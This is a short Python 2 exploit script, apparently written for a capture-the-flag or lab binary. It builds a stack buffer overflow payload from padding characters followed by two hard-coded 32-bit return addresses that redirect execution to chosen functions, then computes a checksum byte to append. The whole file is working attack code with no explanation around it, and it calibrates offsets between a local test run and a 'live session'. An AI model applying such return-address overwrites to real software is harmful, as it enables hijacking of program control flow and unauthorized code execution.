# local test case data
test_distance = 60 # distance between buffer[] and return address
test_bufferstart = 0x48 # [ebp-0x38]


# constants
addr_call_first = "\x78\x86\x04\x08"
addr_call_second = "\xbb\x85\x04\x08"


# live session
BUFFERSTART = 0x68
STARTBYTE = 0x64



distance = 60 - (test_bufferstart - BUFFERSTART)

payload = ""
payload += "a"*distance
payload += addr_call_first
payload += addr_call_second

s = STARTBYTE
for c in payload:
  s += ord(c)



print "Padding: " + str(distance)
print "End Byte: " + hex(ord(chr(256 - (s % 256))))

